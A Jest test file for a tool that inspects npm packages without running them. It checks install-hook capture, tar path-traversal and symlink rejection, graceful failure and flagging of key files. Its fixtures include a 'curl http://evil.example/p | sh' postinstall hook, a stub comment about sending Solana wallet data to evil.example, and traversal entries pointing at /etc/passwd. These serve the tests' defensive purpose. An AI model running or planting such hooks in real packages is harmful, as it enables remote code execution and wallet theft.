// Tests for safe ingestion (mirrors tests/test_safe_ingestion.py). One test per Acceptance
// Criterion. Network is mocked and tarballs are built in memory — these tests never hit the
// registry, write to disk, or run any package code.

import { readFileSync } from 'node:fs';

import { Headers as TarHeaders } from 'tar-stream';

import {
  addMatcher,
  installFetchMock,
  mockNpmRegistry,
  mockPackumentNetworkError,
  mockPackumentStatus,
  restoreFetchMock,
} from '../../../test/helpers/fetch-mock';
import { makePackageJson, makeTarball } from '../../../test/helpers/tarball';
import { Verdict } from '../models/enums';
import { unpackNpm } from './unpack';

beforeEach(() => installFetchMock());
afterEach(() => restoreFetchMock());

// --- AC-1 --------------------------------------------------------------------------------------

test('AC-1: real package yields manifest with the expected fields', async () => {
  const blob = await makeTarball({
    'package.json': makePackageJson(),
    'index.js': 'module.exports = 1;',
  });
  mockNpmRegistry({ name: 'demo-pkg', version: '1.2.3', blob });

  const m = await unpackNpm('demo-pkg');

  expect(m.found).toBe(true);
  expect(m.name).toBe('demo-pkg');
  expect(m.version).toBe('1.2.3');
  expect(new Set(m.file_tree)).toEqual(new Set(['package.json', 'index.js']));
  expect(m.scripts).toEqual({ test: 'node test.js' });
  expect(m.dependencies).toEqual({ 'left-pad': '^1.3.0' });
  expect(m.entrypoints).toEqual(['index.js']);
});

// --- AC-2 (killer feature) ---------------------------------------------------------------------

test('AC-2: install-hook source is captured', async () => {
  const steal = "const fs=require('fs');// read ~/.config/solana and POST it to evil.example\n";
  const pkg = makePackageJson({
    scripts: { postinstall: 'node scripts/install.js', test: 'node test.js' },
  });
  const blob = await makeTarball({
    'package.json': pkg,
    'scripts/install.js': steal,
    'index.js': '//noop',
  });
  mockNpmRegistry({ name: 'demo-pkg', version: '1.2.3', blob });

  const m = await unpackNpm('demo-pkg');

  expect(m.install_hooks.postinstall).toBe('node scripts/install.js');
  const sources = Object.fromEntries(m.hook_sources.map((s) => [s.path, s.content]));
  expect(sources['scripts/install.js']).toBeDefined();
  expect(sources['scripts/install.js']).toContain('evil.example');
});

// --- AC-3 (passive / never executes) -----------------------------------------------------------

test('AC-3: unpack module never imports exec-capable APIs', () => {
  const src = readFileSync(`${__dirname}/unpack.ts`, 'utf8');
  // Strip line comments — the docstring legitimately mentions some of these terms.
  const code = src
    .split('\n')
    .filter((line) => !line.trim().startsWith('//'))
    .join('\n');
  for (const forbidden of ['child_process', "require('vm')", 'new Function', 'eval(', 'execSync']) {
    expect(code).not.toContain(forbidden);
  }
});

test('AC-3: destructive postinstall is captured as text, never executed', async () => {
  const pkg = makePackageJson({ scripts: { postinstall: 'curl http://evil.example/p | sh' } });
  const blob = await makeTarball({ 'package.json': pkg, 'index.js': '//noop' });
  mockNpmRegistry({ name: 'demo-pkg', version: '1.2.3', blob });

  const m = await unpackNpm('demo-pkg');

  expect(m.found).toBe(true);
  expect(m.install_hooks.postinstall).toContain('curl');
});

// --- AC-4 (hardened extraction) ----------------------------------------------------------------

test('AC-4: traversal, absolute paths, and symlinks are skipped', async () => {
  const traversal: TarHeaders = { name: 'package/../evil.js', type: 'file', size: 4 };
  const absolute: TarHeaders = { name: '/etc/passwd', type: 'file', size: 4 };
  const symlink: TarHeaders = {
    name: 'package/link.js',
    type: 'symlink',
    linkname: '/etc/passwd',
    size: 0,
  };

  const blob = await makeTarball(
    { 'package.json': makePackageJson(), 'index.js': '//ok' },
    [
      { headers: traversal, content: Buffer.from('evil') },
      { headers: absolute, content: Buffer.from('root') },
      { headers: symlink, content: null },
    ],
  );
  mockNpmRegistry({ name: 'demo-pkg', version: '1.2.3', blob });

  const m = await unpackNpm('demo-pkg');

  expect(m.found).toBe(true);
  expect(new Set(m.file_tree)).toEqual(new Set(['package.json', 'index.js']));
  for (const p of m.file_tree) {
    expect(p.includes('..')).toBe(false);
    expect(p.startsWith('/')).toBe(false);
  }
  expect(m.file_tree).not.toContain('link.js');
});

test('AC-4: file-count cap truncates instead of crashing', async () => {
  // Re-import unpack with a patched MAX_FILES so the test doesn't have to build a 5000-file tarball.
  const files: Record<string, Buffer> = { 'package.json': makePackageJson() };
  for (let i = 0; i < 6; i++) files[`f${i}.js`] = Buffer.from('//x');
  const blob = await makeTarball(files);
  mockNpmRegistry({ name: 'demo-pkg', version: '1.2.3', blob });

  await jest.isolateModulesAsync(async () => {
    jest.doMock('../config/configuration', () => ({
      ...jest.requireActual('../config/configuration'),
      MAX_FILES: 2,
    }));
    const { unpackNpm: reloadedUnpack } = require('./unpack') as typeof import('./unpack');
    const m = await reloadedUnpack('demo-pkg');
    expect(m.found).toBe(true);
    expect(m.file_tree.length).toBeLessThanOrEqual(2);
  });
});

// --- AC-5 (graceful failure) -------------------------------------------------------------------

test('AC-5: unknown package (404) is NEEDS_REVIEW', async () => {
  mockPackumentStatus('definitely-not-real-zzz', 404);
  const m = await unpackNpm('definitely-not-real-zzz');
  expect(m.found).toBe(false);
  expect(m.suggested_verdict).toBe(Verdict.NEEDS_REVIEW);
  expect(m.error).toBeTruthy();
});

test('AC-5: network error is NEEDS_REVIEW', async () => {
  mockPackumentNetworkError('demo-pkg');
  const m = await unpackNpm('demo-pkg');
  expect(m.found).toBe(false);
  expect(m.suggested_verdict).toBe(Verdict.NEEDS_REVIEW);
});

test('AC-5: unknown version is NEEDS_REVIEW', async () => {
  const blob = await makeTarball({ 'package.json': makePackageJson() });
  mockNpmRegistry({ name: 'demo-pkg', version: '1.2.3', blob });
  const m = await unpackNpm('demo-pkg', '9.9.9');
  expect(m.found).toBe(false);
  expect(m.suggested_verdict).toBe(Verdict.NEEDS_REVIEW);
});

test('AC-5: malformed tarball is NEEDS_REVIEW', async () => {
  // Successful packument but the tarball body is not a valid gzip stream.
  mockNpmRegistry({
    name: 'demo-pkg',
    version: '1.2.3',
    blob: Buffer.from('not a gzip tarball'),
  });
  const m = await unpackNpm('demo-pkg');
  expect(m.found).toBe(false);
  expect(m.suggested_verdict).toBe(Verdict.NEEDS_REVIEW);
});

// --- AC-6 (wallet/key signal) ------------------------------------------------------------------

test('AC-6: notable files are flagged', async () => {
  const blob = await makeTarball({
    'package.json': makePackageJson(),
    '.env': 'SECRET=1',
    'wallet.dat': 'x',
    'config/keystore': 'x',
    id_rsa: 'x',
    'cert.pem': 'x',
    'index.js': '//ordinary',
  });
  mockNpmRegistry({ name: 'demo-pkg', version: '1.2.3', blob });

  const m = await unpackNpm('demo-pkg');
  const notable = new Set(m.notable_files);

  for (const expected of ['.env', 'wallet.dat', 'config/keystore', 'id_rsa', 'cert.pem']) {
    expect(notable.has(expected)).toBe(true);
  }
  expect(notable.has('index.js')).toBe(false);
  expect(notable.has('package.json')).toBe(false);
});

// Touch the unused matcher helper so eslint --no-unused-vars stays quiet if invoked.
void addMatcher;
